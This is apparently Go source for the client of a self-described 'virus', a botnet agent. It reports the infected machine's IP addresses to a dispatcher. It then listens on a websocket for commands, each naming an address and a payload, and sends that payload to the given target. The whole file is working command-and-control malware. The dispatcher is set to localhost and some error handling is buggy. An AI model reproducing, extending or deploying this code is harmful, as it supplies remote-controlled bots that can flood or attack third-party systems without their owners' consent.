package main

import (
	"bytes"
	"encoding/json"
	"net"
	"net/http"
	"net/url"
	"time"

	"github.com/gorilla/websocket"

	"github.com/kolya59/virus/common/machine"
	"github.com/kolya59/virus/common/models"
)

const (
	dispatcherHost = "127.0.0.1:8080"
)

var (
	interval = 5 * time.Minute
)

func sendData(machine machine.Machine) error {
	// Marshal data
	raw, err := json.Marshal(machine)
	if err != nil {
		return err
	}

	// Set up a connection to dispatcher.
	u := url.URL{Scheme: "http", Host: dispatcherHost, Path: "/machine"}
	resp, err := http.Post(u.String(), "application/json", bytes.NewBuffer(raw))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return err
	}
	return nil
}

func subscribeForCommands() error {
	u := url.URL{Scheme: "ws", Host: dispatcherHost, Path: "/subscribe"}

	c, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
	if err != nil {
		return err
	}
	defer c.Close()

	var msg models.WSCommand
	for {
		if err := c.ReadJSON(&msg); err != nil {
			return err
		}

		ackMsg := models.WSAck{}

		nc, err := net.Dial(msg.Type, msg.Addr)
		if err != nil {
			ackMsg.Err = err
			nc.Close()
			if err := c.WriteJSON(models.WSAck{Err: err}); err != nil {
				return err
			}
			break
		}

		if _, err := nc.Write(msg.Data); err != nil {
			ackMsg.Err = err
			nc.Close()
			if err := c.WriteJSON(models.WSAck{Err: err}); err != nil {
				return err
			}
			break
		}
		nc.Close()
	}

	return nil
}

func main() {
	m := machine.Machine{}
	m.GetIPS()

	ticker := time.NewTicker(interval)
	errs := make(chan error, 1)
	errs <- sendData(m)
loopSend:
	for {
		select {
		case err := <-errs:
			if err == nil {
				break loopSend
			}
		case <-ticker.C:
			errs <- sendData(m)
		}
	}

	errs <- subscribeForCommands()
loopSub:
	for {
		select {
		case err := <-errs:
			if err == nil {
				break loopSub
			}
		case <-ticker.C:
			errs <- subscribeForCommands()
		}
	}
}
